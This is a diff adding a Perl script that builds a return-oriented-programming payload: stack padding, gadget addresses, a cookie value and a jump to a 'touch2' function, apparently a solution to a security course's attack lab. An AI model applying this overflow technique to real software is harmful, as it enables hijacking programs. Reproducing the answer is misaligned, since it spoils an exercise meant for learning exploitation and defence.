@@ -1,0 +1,15 @@
+$var = "a"x40; #padding
+
+# need to call popcookie gagdet here
+$var = $var . "\x17\x1b\x40" . "\x00"x5; #popcookie gadget reverse
+                               # shouldn't matter that it's rax because
+			       # the function only looks at bottom half of edi 
+
+$var = $var . "\x00"x0 . "\x53\x7c\x45\x4f"; # Put cookie on stack
+
+# need to call putcookie from rax to rdi here
+$var = $var . "\x10\x1b\x40" . "\x00"x5; #putcookie from rax into edi
+
+$var = $var . "\x57\x19\x40" . "\x00"x5; #return to touch2 address
+
+print $var;
